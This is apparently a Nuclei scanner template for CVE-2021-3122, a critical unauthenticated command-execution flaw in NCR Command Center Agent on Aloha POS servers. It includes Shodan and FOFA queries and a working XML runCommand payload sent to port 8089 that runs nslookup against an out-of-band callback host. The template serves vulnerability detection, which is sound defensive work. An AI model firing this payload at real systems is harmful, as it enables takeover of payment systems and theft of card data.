id: CVE-2021-3122
info:
  author: daffainfo,jjcho
  classification:
    cpe: cpe:2.3:a:ncr:command_center_agent:16.3:*:*:*:*:*:*:*
    cve-id: CVE-2021-3122
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-78
    epss-percentile: 0.99411
    epss-score: 0.87096
  description: 'CMCAgent in NCR Command Center Agent 16.3 on Aloha POS/BOH servers
    permits the submission of a runCommand parameter (within an XML document sent
    to port 8089) that enables the remote, unauthenticated execution of an arbitrary
    command as SYSTEM, as exploited in the wild in 2020 and/or 2021. NOTE: the vendor''s
    position is that exploitation occurs only on devices with a certain "misconfiguration."

    '
  impact: 'Unauthenticated attackers can execute arbitrary system commands as SYSTEM
    on NCR Aloha POS/BOH servers by submitting malicious XML documents to port 8089,
    potentially compromising point-of-sale systems and accessing sensitive payment
    data.

    '
  metadata:
    fofa-query: mynodename
    max-request: 1
    product: command_center_agent
    shodan-query: mynodename
    vendor: ncr
    verified: true
  name: NCR Command Center Agent 16.3 - Remote Command Execution
  reference:
  - https://hcs-team.com/blog/cve-2021-3122/
  - https://github.com/acquiredsecurity/CVE-2021-3122-Details/blob/main/CVE-2021-3122
  - https://www.tetradefense.com/incident-response-services/active-exploit-a-remote-code-execution-rce-vulnerability-for-ncr-aloha-point-of-sale/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-3122
  remediation: 'Apply the latest security updates from NCR to disable the vulnerable
    runCommand functionality or implement proper authentication and input validation
    on the CMCAgent service.

    '
  severity: critical
  tags: cve,cve2021,ncr,rce,vkev,intrusive,vuln
tcp:
- host:
  - '{{Hostname}}'
  inputs:
  - data: '{{payload}}'
  matchers:
  - condition: and
    dsl:
    - contains(interactsh_protocol,'dns')
    - contains_all(raw, '<cmcsys', 'myNodeName')
    type: dsl
  port: 8089
variables:
  payload: <workitemroot commandname="runCommand"><WorkItem><WorkItemId>1</WorkItemId><CommandName>runCommand</CommandName><SourceNode>0</SourceNode><TargetNode>0</TargetNode><Status>InProgress</Status></WorkItem><command><Arguments>nslookup
    {{interactsh-url}}</Arguments><Guid>00000000-0000-0000-0000-000000000001</Guid><Result></Result><destserver>WebServer</destserver></command></workitemroot><:EOM:>
